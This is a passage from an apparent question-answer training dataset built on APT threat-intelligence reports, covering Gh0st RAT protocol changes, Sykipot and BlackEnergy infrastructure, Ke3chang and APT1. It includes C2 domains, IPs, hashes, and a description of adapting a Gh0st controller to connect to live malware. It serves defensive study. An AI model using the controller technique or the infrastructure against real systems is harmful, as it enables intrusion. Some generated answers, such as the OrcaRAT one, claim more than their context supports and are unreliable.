suggests that the adversary is not only\nusing their first-stage infrastructure for offensive actions against targets, but also for further expansion of their botnet.\nDespite FRATeRNAL JACKAL no longer publicly posting motivations and notices of upcoming attacks to Pastebin, their botnet remains online and capable of performing attacks. It is likely that in the event of future tensions between Iran and western countries, this group may publicly resurface and continue their attack campaigns.\nSmall Headline: 2014 ZERO-DAY ACTIvITY\nThe occurrence of a zero-day, or a previously unknown vulnerability being exploited in the wild, is generally an unusual occurrence. These events almost always tell an interesting story when they are initially discovered. During the course of 2014, there were hundreds of newly identified vulnerabilities that were categorized by Mitre under the Common Vulnerabilities and exposures (CVe) system. Many of these were identified by researchers or vendors through auditing and other proactive security reviews.\nIn some cases, the vulnerabilities were first identified being used by adversaries (the development and proliferation of those vulnerabilities are a fascinating component of the threat landscape). There were several such events that occurred this year; three are particularly interesting from an adversary perspective, namely CVe-2014-0322, CVe-2014-4113, and CVe-2014-1761. There were numerous interesting exploits identified this year, many used by various adversaries such as the SSL Heartbleed attack (CVe-2014-0160) and the ShellShock Bourne Again Shell (BASH) vulnerabilities (CVe-2014-6271, CVe-2014-6277, CVe-2014-6278, CVe-2014-7169, CVe-2014-7186, and CVe-2014-7187). These exploits were not necessarily exemplary of the related adversary narrative that helps to determine the \"who\" behind the attacks that CrowdStrike focuses on from an intelligence standpoint.\n\nWhat significant zero-day vulnerabilities were identified in 2014 that were particularly interesting from an adversary perspective? How do these vulnerabilities contribute to the threat landscape?",
    "output": "In 2014, several significant zero-day vulnerabilities were identified, including CVE-2014-0322, CVE-2014-4113, and CVE-2014-1761. These vulnerabilities were notable because they were first identified being used by adversaries, highlighting the sophistication and resourcefulness of threat actors. Such zero-day exploits contribute to the threat landscape by providing adversaries with powerful tools to breach defenses undetected, often before patches are available. Understanding these vulnerabilities helps cybersecurity experts develop proactive measures and improve incident response strategies to mitigate similar threats in the future.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What specific features of Agent Tesla are enabled in this variant, and how does it exfiltrate stolen data? Provide details on the types of data targeted and the methods used for exfiltration.",
    "output": "In this variant of Agent Tesla, the attacker has enabled the features for stealing credentials and cookies. The malware targets over 70 software clients, including web browsers, email clients, IM clients, VPN/FTP/Downloader/Database clients, and Windows credentials. The stolen data includes saved passwords, login user names, and URLs of login pages. Each set of stolen credentials is saved in a global list variable, which is later formatted and sent to the attacker. The malware uses various methods to exfiltrate the stolen data, such as sending it to a remote server or using other communication channels specified by the attacker.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Standard Gh0st RAT Protocol\nThe standard network protocol for Gh0st RAT 3.6 employs zlib compression, which utilizes 'Gh0st' as a static five-byte packet flag that must be included in the first five bytes of initial transmission from the victim (as seen in Figure 1). During the initial login request, the 3.6 version of Gh0st RAT enumerates system information and transmits that information to the controller. The proceeding eight bytes of the packet contain both compressed and uncompressed size information followed by the zlib compressed data, starting with bytes 78 9C at offset 14 (shown in Figures 1 and 2, below).\nMedium Headline: Victim to controller\nAfter a successful login, the controller returns an acknowledgment to the victim with the correct header using the packet flag which it is programmed to verify, as seen in Figure 2. The connection will be established only if the packet flags match.\nFollowing the first five bytes, the packet then shows the full packet size and the uncompressed data size. The Gh0st packet header for version 3.6 uses the 13-byte format shown in Figure 3:\nAfter the packet flag, packet length and unzip length have been verified, a working connection is created between the victim and the controller. Subsequent keep-alive transmissions ensure a continuous connection.\nOnce Gh0st RAT is connected, the attacker has full remote administration tool (RAT) functionality via the controller. Available remote functionality includes:\n\u2022 Fully functional remote desktop display, including the ability to remotely block user input\n\u2022 Fully functional file manager that lists local and network drives\n\u2022 Ability to interact with running processes\n\u2022 Ability to interact via the command console\n\u2022 Key logging\n\u2022 Audio capture\n\u2022 Webcam capture\n\u2022 Ability to send 'Windows style' alerts to the victim, which can display any text the attacker enters into the controller\nThese features ensure complete remote control of the computer.\nBig Headline: Changes to the Gh0st RAT Protocol\nIn an older version of the customized Gh0st RAT malware, the protocol packet flag is no longer represented by the string 'Gh0st'. The Ghost Dragon group modified the source code and changed the packet flag to 'XYTvn', as seen in Figure 4. The packet structure still implements the same 13-byte header format, including the starting zlib compression bytes of '78 9C':\nSample: f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197\nIn a more recent version of the modified Gh0st RAT malware, Ghost Dragon implemented dynamic packet flags which change the first five bytes of the header in every login request with the controller. This complicates identifying its network traffic, as the header bytes in the zlib compressed data section no longer start with '78 9C', as shown in Figure 5.\nIn some cases this was achieved through a simple XOR obfuscation of the packet data, beginning with the zlib header. SPEAR has observed numerous different XOR keys utilized by the group. No changes to the compression have been found; however, it is trivial to implement a modified compression protocol.\nSample: 1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42\n(Note: At the time of this report, the C2 for the sample was active and the malware could still establish an active connection to the Ghost Dragon controller at bbs.winupdate[dot]net. Currently, the domain bbs.winupdate[dot]net resolves to 122.10.18[dot]166).\nThe reply from the active command and control server can be seen in Figure 6:\nSample: 1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42\nBig Headline: Connecting to the Ghost Dragon Malware\nAfter successful identification of the malware as Gh0st RAT and confirmation of the modified command and control protocol, the final step toward verification was to connect with the malware to ensure that it would parse the normal Gh0st RAT commands.\nI was able to compile a custom controller from the source code for the purposes of testing the Ghost Dragon malware. I bypassed the header checks looking for the 'Gh0st' packet flag, and reprogrammed the standard Gh0st RAT controller to reply with the packet flag sent from the victim.\nI used sample 6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df for testing, which was executed by f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197 during analysis on Windows XP. This sample transmitted the static five byte packet flag 'XYTvn'.\nI ran the victim malware and changed the host's file to point the domain to a host-only IP address. I received a connection attempt from the victim and a response from the controller returned the correct packet flag. Afterward, the keep-alive packets between the victim and controller maintained the connection, which allowed me to test the functionality of 6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df with the custom Gh0st RAT controller.\nThe following screen shots were obtained while connected to the malware:\nThe HOSTNAME field shown in Figure 7 was programmed in my custom controller to display 'Gh0st variant', just in case the incoming structure parsed from the victim did not match the format of the default 'LOGININFO' structure from Gh0st RAT 3.6.\nI attained full functionality using the Gh0st 3.6 protocol in the controller, despite the fact that the incoming structure was not exactly what my customized controller expected. As shown in Figure 8, I successfully added an\nadministrative user while remotely connected via my custom Gh0st RAT console within the malware dropped from sample f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197.\nFigure 8 demonstrates that some of the characters in the window are not in English and are not displayed properly on the form. This is due to the fact that the characters were written in Mandarin in the original Gh0st RAT 3.6 source. I changed phrases in the main connection window (Figure 7) for demonstration purposes only.\nThe remaining features of the Gh0st RAT protocol were tested successfully with the custom Gh0st RAT controller while connected to 6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df.\nAdditional analysis into other samples is ongoing and more information will be forthcoming.\nNetwork IOCs and Infrastructure Overlap\nQuestion: What steps were taken to verify the functionality of the Ghost Dragon malware, and how was the custom Gh0st RAT controller adapted to communicate with the modified malware?",
    "output": "Answer: To verify the functionality of the Ghost Dragon malware, the researcher compiled a custom controller from the source code and bypassed the header checks looking for the 'Gh0st' packet flag. The standard Gh0st RAT controller was reprogrammed to reply with the packet flag sent from the victim. The researcher used a sample of the malware, executed it on Windows XP, and modified the host's file to point the domain to a host-only IP address. Upon receiving a connection attempt from the victim, the controller responded with the correct packet flag, maintaining the connection with keep-alive packets. This allowed the researcher to test the functionality of the malware using the custom Gh0st RAT controller, achieving full functionality despite the incoming structure not matching the expected format.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Sykipot Activity\nAs previously\t discussed,\t before it expired,\t 'todaygonever.com' pointed to\t a C2 server associated with both the Destroy\t RAT\t and NightDragon malware.\t The same domain is also\t associated with\t Sykipot activity\t through\t shared C2 server infrastructure,\t and\t domain registration information.\nOver its lifetime the domain 'todaygonever.com' pointed to\t numerous IP\t addresses,\t many\t of which are not\t noteworthy as they\t were assigned\t to servers that\t hosted\t numerous websites.\t Four of\t the IP\t addresses,\t however,\t are of particular note \u2013 IP\t addresses 67.90.204.228 (as previously discussed), 67.79.149.90,\t 209.133.72.83 and\t an IP address allocated\t to a large US financial institution.\n82 Malware detected as\t 'Trojan.Win32.AgentBypass' uses\t the callback domain 'bbs.ezxsoft.com'. Malware detected\t as 'Trojan.Win32.Generic'\t uses the callback\t domain 'pc.nprotects.org'. (GFI SandBox 2011) (GFI SandBox 2011)\n83 Both\t pieces\t of malware create a directory named '03a075fb70d5d675f9dc26fc'\t and a subdirectory named 'update'. (GFI SandBox 2011) (GFI SandBox 2011)\n84 For further details\t of the links, refer to the paper 'SK Hack by an Advanced Persistent Threat'. (Command Five Pty Ltd, 2011)\nIP\t address 67.79.149.90 previously\t hosted\t the known Sykipot domain 'help.newcarstyle.com'. Both IP\t address 67.79.149.90 and IP address 209.133.72.83\t previously\t hosted 'bluelightness.com' subdomains85 .\t They therefore have additional links to\t Sykipot activity\t as 'shopping.bluelightness.com' was previously\t hosted on IP\t address 209.53.155.244 \u00adthe same IP address as the known Sykipot domains 'www.topix21century.com' and 'notes.topix21century.com'86 .\t The 'bluelightness.com' domain is also\t linked\t to\t 'mail\u00adkr2.com' \u00ada Destory RAT\t and NightDragon domain previously\t discussed.\t Both\t domains share infrastructure with\t the domain 'worldsecuritys.com'87 .\nAs of\t 6 February,\t the domains 'file.filesdelete.com',\t 'news.welldone123.net' and 'well.welldone123.net' all point to the IP\t address allocated\t to the large US financial institution (to which\t 'todaygonever.com' also previously\t pointed.)\t The domain 'welldone123.net' is\t a known Sykipot callback domain88 .\t The domain 'filesdelete.com' is also\t otherwise associated\t with malware89.\nThe email address listed\t in the domain registration for 'todaygonever.com' was 'janagreen2000@gmail.com'.\t The same contact\t email address (but\t different\t name, address,\t and\t phone and fax\t numbers) was also\t used\t in the domain registration for 'centurycpc.com', 'filesdelete.com', 'greenrightway.com', 'quicklyfindme.com', and 'newcarstyle.com' \u2013 at\t least two of which\t are known Sykipot malware domains90 .\n85 IP address 67.79.149.90 previously hosted 'helpdesk.bluelightness.com' and\t IP address 209.133.72.83 previously hosted 'shopping.bluelightness.com'.\n86 IP\t address 209.53.155.244 previously hosted 'notes.topix21century.com', 'shopping.bluelightness.com', and 'www.topix21century.com'. The webpage 'topix21century.com' was used, in what is believed to have been a targeted\t attack, to install Sykipot malware on computers\t which\t visited the webpage. The installed malware then communicated with a C2 server located at 'notes.topix21century.com'. (Symantec Corporation, 2010) (MalwareGroup.com)\n87 In 2011 both the known callback\t domain 'cb85.mail\u00adkr2.com' and\t 'test.worldsecuritys.com'\t pointed\t to IP\t address 12.68.249.62, the later still points there as\t of 9\t February 2012. In 2011, 'bluelightness.com'\t and 'worldsecuritys.com'\t both\t pointed\t to IP address 68.178.232.100, the later still points\t there as of 9\tFebruary 2012.\n88 The domain 'welldone123.net'\t is known to be associated with the Sykipot series\t of attacks. (Symantec Corporation, 2012)\n89 The domain 'www.filesdelete.com'\t is\t associated with 'Troj/Bdoor\u00adBDM'. (Sophos Ltd., 2012)\n90 The domain 'help.newcarstyle.com'\t is a known Sykipot callback, as is 'greenrightway.com'. (Symantec Corporation, 2012) (Malware Domains, 2012)\nBig Headline: INSIGHTS\n\u0141 Increasingly,\t instead of\t malware using the default\t DNS servers on a compromised computer to\t resolve its\tcallback domains to IP\t addresses,\t attackers will specify DNS\t servers for the malware to use.\t This has significant implications for network defenders.\t Such\t requests,\t if allowed,\t will bypass the victim's DNS servers and defeat\t any\t blacklists used by\tthe victim's own DNS servers.\t Furthermore,\t the requests will not\t appear in the victim's DNS server logs,\t making\t detection and investigation more difficult.\n\u0141 Organisations should\t consider blocking internal DNS traffic\tto all locations other than the company's own DNS\t servers.\t Furthermore they should\t be alert\t to any\tDNS\t communication attempts \tto locations other than the company's own DNS\t servers,\t as this may\tbe an indicator of\t a malware infection.\n\u0141 When code signing certificates are revoked\t the date of\t effect\t of\t the revocation is\tchosen so that, where possible,\t legitimate software signed with\tthe certificate continues to validate.\t Unfortunately,\t this means that\t sometimes malware signed with a compromised certificate will also\t continue to validate (despite the revocation).\n\u0141 Some malware attempts\tto communicate with C2 infrastructure at frequent intervals.\t The frequency\tof these communication attempts can be used to detect\t the malicious activity.\n\u0141 TCP port 443\t traffic is often allowed\t out of a network without\t inspection by\tnetwork security\t appliances as it\t is\t expected to\t be legitimate,\t encrypted\t SSL communications that can be difficult\t to\t inspect.\t Unfortunately,\nattackers take advantage of\t this by\tusing\t the port to\t bypass security\tappliances to communicate with\ta C2 server (such\tas with\t the observed X\u00adShell communications).\n\u0141 Attackers often reuse the same code for their malware.\t Sometimes they will recompile the code,\t sometimes they\t will merely\t reconfigure the malware.\t This alters the file hash and\t therefore such\ta hash\tis not an effective signature for other configurations of the malware. Hashes of the individual code sections (e.g. .text, .rdata,\t .reloc) make for more robust detection as sections within the malicious files often remain the same.\n\u0141 The majority of legitimate external network communications use the DNS\t protocol to\t determine their destination's IP\t address.\t Outbound network activity that occurs\t without a DNS\t lookup should\t be treated with\t suspicion until the purpose of\t the communications can otherwise be determined.\n\u0141 Blocking\t outbound\t communication attempts that are not\t preceded\t by\ta DNS\t lookup\tcan be effective in blocking C2\tcommunication attempts that are made direct to\t an IP\t address (such\tas to an IP\t address listed within an X\u00adShell configuration webpage).\t Legitimate destination IP addresses should\t be whitelisted to\t prevent\t legitimate activity\t from also being blocked.\n\u0141 Attackers will sometimes continue to\t use a callback domain even when it is listed\t on blacklists and\t in multiple malware analysis reports.\n\u0141 Blacklisting\t a domain can be useful but\t taking\t the time to research\t the domain and\t associated activity\tcan help\t with \tthe development of more effective, longer term\t mitigation strategies.\nBig Headline: DISCLAIMER\nMachine translation software and\t automated\t malware analysis\t reports have been heavily\t relied on throughout\t the development\t of this paper. While data has been verified\t against multiple sources where possible, Command Five Pty Ltd does not guarantee the veracity\tof sources or the accuracy\t of\t the information. Command Five Pty\t Ltd\t reminds\t readers to\t exercise caution when visiting untrusted websites and/or opening untrusted digital documents.\t Command\t Five Pty\t Ltd does not warrant that the websites referenced in this paper are trustworthy.\n\nBased on the above text, answer a question. How can the frequency of malware communication attempts with C2 infrastructure be used to detect malicious activity, and what other methods can be employed to enhance detection?",
    "output": "The frequency of malware communication attempts with C2 infrastructure can be used to detect malicious activity because some malware attempts to communicate with C2 servers at frequent intervals. Monitoring for such frequent communication patterns can help identify potential malware infections. Additionally, other methods to enhance detection include analyzing outbound network activity that occurs without a DNS lookup, as this can be indicative of suspicious behavior. Blocking outbound communication attempts that are not preceded by a DNS lookup, while whitelisting legitimate destination IP addresses, can also be effective in preventing C2 communication attempts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "OrcaRAT - A whale of a tale\nBy Dan Kelly and Tom Lancaster\nIt's every malware analyst's dream to be handed a sample which is, so far, unnamed by the AV community - especially when the malware in question may have links to a well-known APT group.\nIn my line of work I analyse several 'unknown' malware samples a week, but often it turns out that they are simply new variants of existing malware families. Recently I was fortunate enough to be handed something that not only had a low detection rate but, aside from heuristics, seemed to be relatively unknown to the top 40 anti-virus companies.\nIn this post I will walk you through the malware family we've dubbed \"OrcaRAT\".\nFirst of all, it is worth pointing out that most of the malware I see on a day-to-day basis is espionage orientated, and very rarely do the programmers and operators make much effort to cover their tracks. The use of forged HTTP headers is a common occurrence and simple mistakes within these headers are frequent.\nThe malware in question was handed to me by one of our threat intelligence analysts who was hunting through infrastructure associated with some samples of Comfoo[1] malware and happened across a malware sample (253a704acd7952677c70e0c2d787791b8359efe2c92a5e77acea028393a85613) he didn't recognise. He immediately took the malware and passed it through first stage analysis, which involves running the file in a sandbox environment. After this, he handed it over for more in-depth capability analysis.\n\nAnswer this question based on the above context: How does the discovery of OrcaRAT differ from typical malware analysis processes, and what unique characteristics set it apart from commonly encountered malware?",
    "output": "The discovery of OrcaRAT stands out because it was initially unrecognized by the top 40 anti-virus companies, indicating a low detection rate and potential novelty. Unlike typical malware, which often consists of new variants of existing families, OrcaRAT appeared to be relatively unknown. This uniqueness was further highlighted by its association with infrastructure linked to Comfoo malware, suggesting potential ties to a well-known APT group. Additionally, while most espionage-oriented malware makes little effort to conceal its tracks, OrcaRAT exhibited characteristics that made it more challenging to detect and analyze, setting it apart from the usual malware encountered in day-to-day analysis.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: The advanced persistent threat\nThe worldwide deployment of espionage-focused malware has made this generation the Golden Age of espionage. Global reach, stealthy maneuvers, legal cover, and plausible deniability\u2014what more could a spy ask for? That is why FireEye focuses on the vexing problem of the advanced persistent threat (APT).\nAPT activity is best described as a campaign, a series of attacks over time. Each attack comprises a variety of phases, including reconnaissance, exploitation, command and control, lateral movement, and exfiltration.3 Intelligence can be extracted during each phase of the attack to build a full understanding of the tools, techniques, and procedures (TTPs) used by a particular APT campaign's life cycle. However, network defenders may have only partial visibility into any single incident. That makes tracking and correlating activity across multiple related incidents critical.\n1 Information Warfare Monitor. \"Tracking GhostNet: Investigating a Cyber Espionage Network\". March 2009. The SecDev Group. \"Shadows in the Cloud: An investigation into cyber espionage 2.0.\" April 2010. SecureList. \"'Red October'\" Diplomatic Cyber Attacks Investigation\". January 2013. SecureList. \"The NetTraveller\". June 2013.\n2 G20 Leaders' Summit, St. Petersburg on September 5-6, 2013\n3 Cloppert, M. \"Defining APT Campaigns\". June 2010. Cloppert, M. \"Attacking the Cyber Kill Chain\". October 2009. Bejtlich, R. \"Incident Phases of Compromise\". June 2009.\nMedium Headline: The Ke3chang campaign\nThe Ke3chang attackers have been active since at least 2010. Tracking their activity over time has revealed information on their targeting preferences and the malware tools they use. The attackers have used three types of malware over the years and have traditionally targeted the aerospace, energy, government, high-tech, consulting services, and chemicals/manufacturing/mining sectors. However, the number of attacks against entities in these sectors has been small. The scarcity of individual attacks may indicate the attackers are selective about their targets.\nDuring August 2013, FireEye gained visibility on one of 22 CnC servers used at that time by the Ke3chang attackers. In addition to confirming compromised endpoints at several MFAs, FireEye gained unique insight into the attackers' lateral movement activities. In this report, we present the historical intelligence we have gathered on the Ke3chang campaign, as well as an in-depth assessment of the ongoing Syrian-themed attacks against these MFAs. Our objective is to arm network defenders with information to combat this threat actor.\nMedium Headline: Targeting\nTraditionally, the Ke3chang attackers have used spear-phishing emails with either a malware attachment or a link to a malicious download. They have also leveraged a Java zero-day vulnerability (CVE-2012-4681), as well as older, reliable exploits for Microsoft Word (CVE-2010-3333) and Adobe PDF Reader (CVE-2010-2883). The Ke3chang attackers have also sent Windows screensaver files (.scr) and executable files (.exe) using the Unicode Right-To-Left-Override (RTLO) technique to cloak the original filename extension from the targeted user.4 In addition to the recent Syria-themed campaign, they also used a London Olympics-themed campaign in 2012 and one that involved former model and French first lady Carla Bruni in 2011.\n4 Ke3chang used the Java vulnerability (CVE-2012-4681) before a patch was available. Krebs, B. \"'Right-to-Left Override' Aids Email Attacks\". September 2011.\n\nQuestion: How does the Ke3chang campaign leverage various phases of an APT attack to achieve its objectives, and why is understanding these phases crucial for network defenders?\n\nAnswer:",
    "output": "The Ke3chang campaign, like many APTs, involves a series of attacks over time, each comprising phases such as reconnaissance, exploitation, command and control, lateral movement, and exfiltration. Understanding these phases is crucial because it allows network defenders to gather intelligence on the tools, techniques, and procedures (TTPs) used by the attackers throughout the campaign's life cycle. This comprehensive understanding enables defenders to track and correlate activities across multiple related incidents, even if they have only partial visibility into any single incident. By recognizing the patterns and methods employed in each phase, defenders can better anticipate and counteract future attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the kernel mode stage 0 driver for Windows 9x (mssvc32.vxd) handle the Dynamic_Init event, and what specific technique does it employ to initiate a call to DLL export in ring-3 from ring-0?",
    "output": "The kernel mode stage 0 driver for Windows 9x (mssvc32.vxd) handles the Dynamic_Init event by retrieving the location of the user-mode loader executable from the registry value [HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] Con\u0141g. If this value is not present, it uses a fallback string hardcoded in the binary: C:\\WINDOWS\\SYSTEM\\SVCHOST32.EXE. Next, it installs a callback procedure using the Windows function _SHELL_CallAtAppyTime. This procedure will be called when the CPU is running in ring-3 mode, allowing a new executable (loader process) to be started via the traditional way. This is a standard trick used by developers in the 90s to initiate a call to DLL export in ring-3 from ring-0 in the Windows 9x OS family.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: CHINA EXPOSED: 2013 REPORTS AND DISCLOSURES JOLT GOVERNMENT CYBER OPERATIONS TO THE FOREFRONT OF THE U.S. SECURITY DIALOGUE\nAs Beijing embarked upon sweeping changes impacting its use of network operations, U.S. Government and defense officials wrestled with how to effectively confront China regarding its cyber espionage activity.26 Although officials had discussed China's use of cyber espionage for years, the issue was not widely recognized in the public sphere. However, early 2013 saw multiple disclosures of breaches targeting media outlets, the release of our APT1 report, and additional reporting that attributed widespread corporate intellectual property theft to military units within China's People's Liberation Army (PLA). This exposure catapulted the issue of Chinese cyber espionage into the public consciousness, and likely provided the U.S. Government with increased momentum with which to confront Beijing - momentum that would quickly dissipate with Edward Snowden's disclosures of U.S. cyber activities.\nIn January 2013, the New York Times disclosed details of a network compromise targeting its reporters that was allegedly the work of the Chinese military.27 Several weeks later, we released our APT1 report, attributing years of corporate intellectual property theft to Unit 61398 of\nthe PLA. APT1 and the many other exposure reports that followed describe in detail the tools, tactics, and targets of Chinese cyber operations, laying bare evidence to support long-held suspicions of China's large-scale cyber espionage activity.\nWhile the reports prompted outraged denials from the Chinese government, U.S. Government officials described the findings as \"essentially correct\" and \"completely consistent with the type of activity [the U.S. government has] been seeing for some time.\"28 29 The threat posed by China's cyber operations emerged as a prominent theme in countless speeches, statements, and reports from U.S. leaders and federal agencies. In May 2013, the Pentagon's annual report to Congress directly accused China of using its military to conduct cyber operations against U.S. firms, and President Obama prepared to raise the issue at the U.S.\u2013China Presidential Summit the following month.30 However, Edward Snowden's coinciding disclosures of U.S. cyber activities diverted public attention to U.S. clandestine operations, complicating any leverage that the U.S. might have had to rebuke China over its economic espionage activities.31\n26  http://www.reuters.com/article/us-usa-china-cyber-idUSTRE7934L220111004\n27  http://www.nytimes.com/2013/01/31/technology/chinese-hackers-infiltrate-new-york-times-computers.html?_r=0\n28  https://www.technologyreview.com/s/511981/unmasked-but-unfazed-chinese-hacking-group-is-still-active/\n29  http://www.nytimes.com/2013/02/19/technology/chinas-army-is-seen-as-tied-to-hacking-against-us.html\n30  http://www.bbc.com/news/world-asia-china-22798572\n31  http://www.bbc.com/news/world-asia-china-22798572\n\nWhat role did the APT1 report play in shaping the U.S.-China dialogue on cyber espionage, and how did it influence the broader geopolitical landscape?",
    "output": "The APT1 report played a pivotal role in shaping the U.S.-China dialogue on cyber espionage by providing concrete evidence that attributed years of corporate intellectual property theft to Unit 61398 of the People's Liberation Army (PLA). The report laid bare the tools, tactics, and targets of Chinese cyber operations, substantiating long-held suspicions of China's extensive cyber espionage activities. This exposure catapulted the issue into the public sphere and gave the U.S. government increased leverage to confront China. U.S. officials described the findings as 'essentially correct' and 'completely consistent' with their observations. The threat posed by China's cyber operations became a central theme in numerous speeches and reports from U.S. leaders and federal agencies. However, the geopolitical landscape was further complicated by Edward Snowden's disclosures of U.S. cyber activities, which diverted public attention and undermined the U.S.'s ability to effectively rebuke China for its actions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: BACKGROUND\nCybercriminals are constantly evolving and adapting in their attempts to bypass computer network defenses. But, larger, more successful threat actors tend to evolve at a slower rate.\nAs long as these actors regularly achieve their objective (stealing sensitive data), they are not motivated to update or rethink their techniques, tactics, or procedures (TTPs). These threat actors' tactics follow the same principles of evolution \u2013 successful techniques propagate, and unsuccessful ones are abandoned. Attackers do not change their approach unless an external force or environmental shift compels them to. As the old saying goes: If it ain't broke, don't fix it.\nSo when a larger, successful threat actor changes up tactics, the move always piques our attention. Naturally, our first priority is ensuring that we detect the new or altered TTPs. But we also attempt to figure out why the adversary changed \u2014 what broke? \u2014 so that we can predict if and when they will change again in the future.\nWe observed an example of this phenomenon around May. About four months after The New York Times publicized an attack on its network, the attackers behind the intrusion deployed updated versions of their Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe malware families [2].\nThe previous versions of Aumlib had not changed since at least May 2011, and Ixeshe had not evolved since at least December 2011.\nWe cannot say for sure whether the attackers were responding to the scrutiny they received in the wake of the episode. But we do know the change was sudden. Akin to turning a battleship, retooling TTPs of large threat actors is formidable. Such a move requires recoding malware, updating infrastructure, and possibly retraining workers on new processes.\nThe following sections detail the changes to Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe.\nRead the text above and answer this question: Why did the attackers behind the intrusion on The New York Times' network suddenly change their tactics, techniques, and procedures (TTPs) after years of using the same methods? How does understanding this change help cybersecurity experts predict future shifts in APT behaviors?",
    "output": "The attackers behind the intrusion on The New York Times' network changed their TTPs likely due to increased scrutiny and publicity following the attack. This change was significant because the previous versions of their malware families, Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe, had remained unchanged for several years (since at least May 2011 and December 2011, respectively). The sudden alteration suggests that the attackers felt compelled to adapt their methods to avoid detection and maintain their effectiveness. Understanding this change helps cybersecurity experts predict future shifts in APT behaviors by recognizing that external forces or environmental shifts, such as increased public attention, can motivate even large, successful threat actors to update their TTPs. By monitoring for such triggers, experts can anticipate and prepare for potential changes in attacker strategies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Victim #3\nThe third organization got compromised by the same type of attack as the first one (an EXE file spoofing a doc within a Zip archive). All the plugins discovered in BE2 files were known, and there was no revelation of hacked network devices on their side and no destroyed data. The noticeable thing is that many computers contained both BE2 and BE3 files and some config files contained the following URL:\nhxxps://46.165.222(dot)28/upgrade/f3395cd54cf857ddf8f2056768ff49ae/getcfg.php\nThe URL contains the md5 of the string 'router'. One of the discovered config files contained a URL with an as yet unidentified md5:\nhxxps://46.165.222(dot)28/upgrade/bf0dac805798cc1f633f19ce8ed6382f/upgrade.php\nBig Headline: Build IDs\nEach config file within BE2 main.dll has a field called build_id which identifies the malware version for the operators. Currently this particular BE/SandWorm gang uses a certain pattern for the build ids containing three hex numbers and three letters, as follows:\n0C0703hji\nThe numbers indicate the date of file creation in the format: Year-Month-Day. Still, the purpose of the letters is unknown, but most likely it indicates the targets. The hex numbers weren't used all the time, sometimes we observed decimal numbers:\n100914_mg\n100929nrT\nMost interesting for us was the earliest build id we could find. Currently it is \"OB020Ad0V\", meaning that the BE2/SandWorm APT started operating as early as the beginning of 2010.\nBig Headline: Appendix: IoC\nWhile BE dropper installs its driver under a randomly picked non-used Windows driver name, like %system32%\\drivers\\AliIde.sys. The driver is self-signed on 64-bit systems\nHowever, new \"APT\" BE2 uses one of the following filenames that are used as an encrypted storage for plugins and the network settings. They are consistent and serve as stable IoC:\n%system32%\\drivers\\winntd_.dat\n%system32%\\drivers\\winntd.dat\n%system32%\\drivers\\wincache.dat\n%system32%\\drivers\\mlang.dat\n%system32%\\drivers\\osver32nt.dat\n%LOCALAPPDATA%\\adobe\\wind002.dat\n%LOCALAPPDATA%\\adobe\\settings.sol\n%LOCALAPPDATA%\\adobe\\winver.dat\n%LOCALAPPDATA%\\adobe\\cache.dat\nBE2 also uses start menu locations for persistence:\nUsers\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\flashplayerapp.exe\nBE3 uses the following known filenames:\n%USERPROFILE%\\NTUSER.LOG %LOCALAPPDATA%\\FONTCACHE.DAT\nBE2 MD5s:\nd57ccbb25882b16198a0f43285dafbb4 7740a9e5e3feecd3b7274f929d37bccf 948cd0bf83a670c05401c8b67d2eb310 f2be8c6c62be8f459d4bb7c2eb9b9d5e 26a10fa32d0d7216c8946c8d83dd3787 8c51ba91d26dd34cf7a223eaa38bfb03 c69bfd68107ced6e08fa22f72761a869 3cd7b0d0d256d8ff8c962f1155d7ab64 298b9a6b1093e037e65da31f9ac1a807 d009c50875879bd2aefab3fa1e20be09 88b3f0ef8c80a333c7f68d9b45472b88 17b00de1c61d887b7625642bad9af954\n27eddda79c79ab226b9b24005e2e9b6c 48937e732d0d11e99c68895ac8578374 82418d99339bf9ff69875a649238ac18 f9dcb0638c8c2f979233b29348d18447 72372ffac0ee73dc8b6d237878e119c1 c229a7d86a9e9a970d18c33e560f3dfc ef618bd99411f11d0aa5b67d1173ccdf 383c07e3957fd39c3d0557c6df615a1a 105586891deb04ac08d57083bf218f93 1deea42a0543ce1beeeeeef1ffb801e5 7d1e1ec1b1b0a82bd0029e8391b0b530 1f751bf5039f771006b41bdc24bfadd3 d10734a4b3682a773e5b6739b86d9b88 632bba51133284f9efe91ce126eda12d a22e08e643ef76648bec55ced182d2fe 04565d1a290d61474510dd728f9b5aae 3c1bc5680bf93094c3ffa913c12e528b 6a03d22a958d3d774ac5437e04361552 0217eb80de0e649f199a657aebba73aa 79cec7edf058af6e6455db5b06ccbc6e f8453697521766d2423469b53a233ca7 8a449de07bd54912d85e7da22474d3a9 3f9dc60445eceb4d5420bb09b9e03fbf 8f459ae20291f2721244465aa6a6f7b9 4b323d4320efa67315a76be2d77a0c83 035848a0e6ad6ee65a25be3483af86f2 90d8e7a92284789d2e15ded22d34ccc3 edb324467f6d36c7f49def27af5953a5 